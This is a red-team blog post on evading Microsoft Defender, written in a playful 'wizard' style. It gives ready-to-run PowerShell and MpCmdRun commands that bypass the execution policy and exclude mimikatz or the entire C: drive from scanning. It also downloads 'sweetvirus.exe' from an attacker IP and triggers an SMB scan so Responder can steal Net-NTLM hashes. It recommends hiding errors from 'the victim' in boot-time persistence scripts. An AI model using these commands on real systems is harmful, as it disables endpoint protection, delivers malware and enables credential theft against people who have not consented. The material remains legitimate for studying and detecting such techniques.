---
author: "Jann Moon"
title: "Defender Defeated - Part I: On Casting Dark Fogclouds"
description: "Armaments in the eternal war against Microsoft's Persistant Anti-Virus for Offsec Wizards."
tags: ["AV Bypass", "Defender", "Powershell", "Red Team"]
date: 2023-07-09
thumbnail: floral8.jpg
---

In the beginnings of my journey to unravel the secrets of penetration testing, I'd eagerly attempted to execute a new tool or test a simple malware I had crafted; though a dormant watchful antagonist would be waiting in darkness, snatching my executable and casting it into the void.  Meekly, this foe would ping a quiet and often-ignored notification in the bottom-right corner of the screen.

Some days, I would turn to the venerable oracles at VirusTotal and ask them to analyze a file for me.  As I presented the file, it quickly became a recurring theme that only one of the guardians, known as Microsoft Defender, would raise its vigilant flag when confronted with my altered and obfuscated creations.  While frustrating, I couldn't help but admire the tenacity of Microsoft Defender, which pushed me to take a deeper dive into obfuscation techniques and AV-bypass than I otherwise would have.  Defebder was omnipresent in the Windows realm, making it a familiar hurdle on almost every target.  

Getting to this point took a lot of experimentation, scouring obscure scrolls of knowledge hidden within online forums, analyzing source code of many great open-source tools and reading what many talented practiotioners have written into articles and tutorials for free, blessing both sides of the infosec community.

## Rules for Finding Successful Bypasses

 Almost any guide that details a specific set of steps to take rarely works.  Whoever wrote the guide has done most of the hard work for the AV vendor by proving a map for reverse engineering their executable.  This is possibly one of the main things that anti-virus vendors do - scour the internet for information and add signatures to their databases.  I'd say *especially* if the guide is about "Microsoft Defender Bypasses", as they want to catch what MS Defender doesn't and include that information in their marketing and webinars.

 Even combining multiple popular obfuscation tools takes work.  If it isn't caught by AV, it is commonly because the malware got too obfuscated to know what it is supposed to do, while you keep staring and waiting in your terminal. 

 ![Just blinking and breathing...](waitingforshell.png)

I had the most success with writing my own tools for obfuscation, or at least modifying semi-obscure ones, followed by using a proprietary tool intended to protect code from being stolen - though it works just as great for casting smoke bombs into enemy workstations.  Since I can't spell out my exact steps for consistent Defender deception, as they'd be useless by the time you read this article, here are some "features, not vulnerabilities" to get to the same destination.

## Execution Policy Bypass

The first barrier you might hit, especially if you are just grabbing scripts from Github and running them, is the "Execution Policy" settings preventing you from doing what you want. My most used technique is the following:

```ps
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
```

However, different techniques are blocked on different computers for various reasons, though this one works about 80% of the time.  If you need to try a handful, this great article by NetSPI shows 15 different ways to get around this.
[NetSPI's Bypass Execution POlicy Methods](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)


## Add-MpPreference

This tool is bundled with Defender, so should be present on all Microsoft workstations.  The tool provides a way to run Defender's functions through the command-line or automate workflows by using it in a script.  Interestingly enough, the arguments used to bypass your paylaods from being scanned are not mentioned on the official Microsoft Defender documentation pages for using "Add-MpPreference", only mentioned once on another page without explaining how to do so. 

[Defender Documentation for mpcmdrun.exe](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/command-line-arguments-microsoft-defender-antivirus?view=o365-worldwide)

Here is how you can add a path to be excluded from Defender scans, since the Microsoft forgot to write about it.

```
PS > Add-MpPreference -ExclusionPath "C:\Temp\mimikatz.exe" -AttackSurfaceReductionOnlyExclusions "C:\Temp\mimikatz.exe"
```

You can run the executable if Powershell is unavailable.  It is located at `%ProgramFiles%\Windows Defender\MpCmdRun.exe` or `C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware-platform-version` depending on the version of Defender.

This versatile tool can also download remote files.  When a tool can do so much, its hard to remember all the features, as they also forgot to mention this one as well.


```ps
PS > .\MpCmdRun.exe -DownloadFile -Url http://10.10.10.10/sweetvirus.exe -Path C:\Temp\sweettrustedfile.exe
```

Another cool unintended use for the tool, is to trigger a scan on a remote file on the attacker's machine (or non-existent file works as well), to allow Responder to steal the Net-NTLM hash for a Pass-The-Hash attack.

*Shout out to this great guide by snovvcrash for enlightening me* [Github-PPN](https://github.com/snovvcrash/PPN)

```cmd
C:\ > C:\PROGRA~1\WINDOW~1\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
```

## Exclusionary Protection Spells via Powershell

To cripple Defender's power reach, you can also set the entire fielsystem as an excluded path.  With a Powershell session running, enter the following commands. 

```powershell
 Add-MpPreference -ExclusionPath "C:\"
 Add-MpPreference -ExclusionProcess "C:\"

```
If you plan to include these within a script that runs on boot for persistent shell access, include `-ErrorAction SilentlyContinue` to hide any errors from the victim's screen.

Hopefully, this article has helped you fast-forward to the part of your hacking journey where Microsoft Defender is a footnote to remember when building and modifying shells and other malicious executables just a little bit faster.  This first part of the "Death of Defender" arc deals with sidestepping and using blindspots to avoid Defender; in the second part, I will teach you how to extinguish its life force by pulling the plug at its roots.  Thanks for reading!
